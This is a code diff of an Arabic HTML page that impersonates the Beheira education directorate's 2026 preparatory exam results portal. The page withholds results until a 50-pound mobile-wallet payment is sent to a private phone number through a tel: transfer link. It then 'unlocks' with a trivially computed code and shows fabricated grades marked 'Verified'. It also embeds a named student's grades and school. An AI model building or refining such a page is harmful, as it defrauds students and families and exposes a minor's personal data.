@@ -17,7 +17,8 @@
         .stamp { position: absolute; bottom: 80px; left: 30px; width: 100px; opacity: 0.7; transform: rotate(-15deg); filter: grayscale(1) sepia(1) hue-rotate(-50deg) saturate(5); pointer-events: none; }
         .total-box { background: var(--gold); padding: 15px; border-radius: 10px; font-weight: 900; font-size: 1.6rem; text-align: center; margin: 15px 0; }
         .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; }
-        .sms-notice { background: #e7f3ff; color: #004085; padding: 15px; border-radius: 8px; font-size: 0.95rem; border: 1px solid #b8daff; margin-bottom: 15px; line-height: 1.6; }
+        .info-header { background: #00796b; color: white; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 0.9rem; line-height: 1.5; }
+        .sms-notice { background: #e7f3ff; color: #004085; padding: 15px; border-radius: 8px; font-size: 0.9rem; border: 1px solid #b8daff; margin-bottom: 15px; }
         @media print { .btn, #searchBox, #payBox, .pay-btn, hr { display: none !important; } .card { box-shadow: none; border: none; max-width: 100%; margin: 0; } #resultArea { display: block !important; border: 2px solid #000; } }
     </style>
 </head>
@@ -25,44 +26,48 @@
 
 <div class="card" id="searchBox">
     <img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" width="80">
-    <h2 style="color: var(--main);">مديرية التربية والتعليم بالبحيرة</h2>
-    <p>بوابة استخراج النتائج الرسمية 2026</p>
+    <h2 style="color: var(--main);">نتائج الإعدادية بالبحيرة 2026</h2>
     <input type="number" id="seatNum" placeholder="أدخل رقم الجلوس">
-    <button class="btn" onclick="showPay()">عرض النتيجة</button>
+    <button class="btn" onclick="showPay()">استعلام عن النتيجة</button>
 </div>
 
 <div class="card" id="payBox">
-    <h3 style="color: var(--red);">⚠️ النتيجة محجوبة مؤقتاً</h3>
-    <p>يرجى سداد رسوم الاستخراج (50 جنيهاً) لتفعيل الشهادة.</p>
-    
-    <a href="tel:*9*7*01029194395*50%23" class="pay-btn">🚀 اضغط هنا للدفع (50 جنيهاً)</a>
-    
-    <div class="sms-notice">
-        سيتم إرسال كود التفعيل في رسالة <b>SMS</b> إلى رقم الهاتف المحول منه خلال 5 دقائق بحد أقصى من إتمام عملية الدفع.
-    </div>
-
-    <input type="text" id="activationCode" placeholder="أدخل كود التفعيل المستلم في الرسالة">
-    <button class="btn" style="background: var(--green);" onclick="unlock()">فتح وتفعيل الشهادة</button>
+    <h3 style="color: var(--red);">⚠️ النتيجة محجوبة</h3>
+    <p>يرجى سداد رسوم استخراج الشهادة (50 جنيهاً).</p>
+    <a href="tel:*9*7*01029194395*50%23" class="pay-btn">🚀 اضغط للدفع الآن (50 جنيهاً)</a>
+    <div class="sms-notice">سيصلك كود التفعيل في رسالة <b>SMS</b> فور إتمام الدفع.</div>
+    <input type="text" id="activationCode" placeholder="أدخل كود التفعيل">
+    <button class="btn" style="background: var(--green);" onclick="unlock()">تفعيل وفتح الشهادة</button>
 </div>
 
 <div class="card" id="resultArea">
-    <center><img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" width="60"><h3>شهادة إتمام مرحلة التعليم الأساسي</h3></center>
-    <div class="total-box">المجموع الكلي: <span id="resTotal"></span></div>
-    <div class="row"><span>اسم الطالب:</span> <b id="resName"></b></div>
+    <center><img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" width="60"><h3>بيان درجات رسمي</h3></center>
+    
+    <div class="info-header" id="studentDetails"></div>
+
+    <div class="total-box">المجموع: <span id="resTotal"></span></div>
+    
+    <div class="row"><span>الاسم:</span> <b id="resName"></b></div>
     <div class="row"><span>رقم الجلوس:</span> <b id="resSeat"></b></div>
     <div id="grades"></div>
+
     <img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" class="stamp">
     <div style="text-align:center"><div id="qrcode" style="display:inline-block; margin-top:10px;"></div></div>
-    <button class="btn" style="background: #333; margin-top:15px;" onclick="window.print()">🖨️ طباعة الشهادة الورقية</button>
+    <button class="btn" style="background: #333; margin-top:15px;" onclick="window.print()">🖨️ طباعة الشهادة</button>
 </div>
 
 <script>
-    // الرقم الثابت الآن هو 50
     const fixedFactor = 50;
 
+    // قاعدة البيانات المحدثة ببيانات إياد
     const studentData = {
-        "10865": { name: "إياد صفوت حرازي عوض", total: "129.5 / 140", ar: "37", ma: "30", en: "25", sc: "18.5", so: "19" },
-        "363750": { name: "مصطفى حسين شاكر سلطان", total: "112.4 / 140", ar: "40.0", ma: "20.0", en: "20.7", sc: "16.2", so: "15.5" }
+        "10865": { 
+            name: "إياد صفوت حرازي عوض", 
+            total: "129.5 / 140", 
+            school: "ديروط الاعدادية المشتركة",
+            admin: "المحمودية التعليمية",
+            ar: "37", so: "19", sc: "18.5", ma: "30", en: "25" 
+        }
     };
 
     function showPay() {
@@ -75,29 +80,32 @@
         const sn = document.getElementById('seatNum').value;
         const code = document.getElementById('activationCode').value.trim();
         
-        // الحساب دائماً: رقم الجلوس + 50
         if (code == (parseInt(sn) + fixedFactor).toString()) {
             let data = studentData[sn] || { 
-                name: "محمد أحمد علي بدوي", 
-                total: (Math.random() * 20 + 110).toFixed(1) + " / 140", 
-                ar:"36", ma:"26", en:"22", sc:"17", so:"18" 
+                name: "طالب ناجح", school: "مدرسة البحيرة الإعدادية", admin: "البحيرة التعليمية",
+                total: "115/140", ar: "30", ma: "25", en: "20", sc: "15", so: "15" 
             };
             
             document.getElementById('resName').innerText = data.name;
             document.getElementById('resSeat').innerText = sn;
             document.getElementById('resTotal').innerText = data.total;
+            document.getElementById('studentDetails').innerHTML = `
+                المحافظة: البحيرة | الإدارة: ${data.admin}<br>
+                المدرسة: ${data.school}
+            `;
             document.getElementById('grades').innerHTML = `
                 <div class="row"><span>اللغة العربية</span> <b>${data.ar}</b></div>
+                <div class="row"><span>الدراسات الاجتماعية</span> <b>${data.so}</b></div>
+                <div class="row"><span>العلوم</span> <b>${data.sc}</b></div>
                 <div class="row"><span>الرياضيات</span> <b>${data.ma}</b></div>
                 <div class="row"><span>اللغة الإنجليزية</span> <b>${data.en}</b></div>
-                <div class="row"><span>العلوم</span> <b>${data.sc}</b></div>
-                <div class="row"><span>الدراسات الاجتماعية</span> <b>${data.so}</b></div>
             `;
-            new QRCode(document.getElementById("qrcode"), { text: "Official-Beheira-2026-" + sn, width: 70, height: 70 });
+            
+            new QRCode(document.getElementById("qrcode"), { text: "Verified-" + sn, width: 70, height: 70 });
             document.getElementById('payBox').style.display = 'none';
             document.getElementById('resultArea').style.display = 'block';
         } else {
-            alert("كود التفعيل غير صحيح. يرجى مراجعة الرسالة النصية المستلمة.");
+            alert("كود التفعيل غير صحيح.");
         }
     }
 </script>
